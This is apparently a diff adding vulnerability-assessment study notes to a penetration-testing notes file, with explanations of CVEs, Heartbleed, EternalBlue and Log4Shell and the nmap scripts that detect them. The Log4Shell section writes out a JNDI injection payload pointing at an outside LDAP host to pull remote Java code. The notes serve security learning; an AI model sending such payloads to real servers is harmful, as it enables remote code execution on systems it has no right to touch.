@@ -639,3 +639,71 @@ use auxiliary/admin/mssql/mssql_enum_domain_accounts
 
 # Vulnerability assesment
 
+## Overview
+Vulnerability
+NIST defn:
+A weakness in computational logic (ie code) found in a software and hardware component that, when exploited, result in a negative immpact to confidentiality, integrity, availability. (CIA triad)
+
+Types.
+Physical
+
+CyberSecurity:
+>Software (service)
+>Operating System
+
+CVEs:
+Unique common identifier
+
+Understanding Vulnerability details page:
+>Descriptions
+>Severity
+>References
+>weakness enuumeration
+>Known affected software configurations
+
+### Case studies
+
+1. Heartbleed bug ( CVE-2014-0160 )
+	nmap script ssl-heartbleed to test (scan against any port using ssl)
+	How it works:
+	During a TLS handshake a password and passwrd length are sent to the server.
+	The server sends back the same password up to the length specified, but if the length is longer than the actual password, additionally info stored in memory is sent with it
+Example:
+Real TLS handshake
+Password: abcd
+pwlength: 4
+
+Server sends back: confirmed, abcd
+
+Heartbleed
+password: abcd
+pwlength: 100
+
+Server sends back: confirmed, abcdt1g3j12j3jasddfg3.... (up to the 100 char length)
+
+2. EternalBlue MS17-010 (CVE-2017-0143)
+Part of the ransomware wannacry attack, Zeroday exploit that took adv of smbv1 in many windows OS's
+Bufferoverflow used
+nmap script to scan : smb-vuln-ms17-010
+
+Example:
+SMB packet with malicious code (reverse shell) sent to the server, bufferoverflow allows for RCE
+Makes a call back to attacker giving a shell.
+In the case of wannacry, EternalBlue used to send the ransomware
+
+3. Log4J (CVE-2021-44228)
+Apache Log4j2 2.0-beta9 JNDI features used in config,log msgs, and params do not protect against attacket controlled LDAP and other JNDI end pts
+Attacker who can control log messages or log message params can execute arbitrary code on LDAP servers when msg lookup substituition is enabled
+
+JNDI: Java Naming and Directory Interface (API directory service to lookup data)
+LDAP: Light-weight Directory Access Protocol , (allows access to code stored remotely to keep app lightweight) 
+
+NSE nmap scripts to detect it exists but are new 
+
+Java applicatns (webapp or otherwise) use Log4j for logging. Developers use it for debugging.
+Effect on Minecraft:
+Input field used is the chat,
+In the chat send : ${jndi:ldap://demo.ine:1389/yourcode}
+---> server fails to parse input as str and evaluates the JNDI lookup
+---> Java class (ie java code elsewhr) is pulled from the attackers LDAP server
+
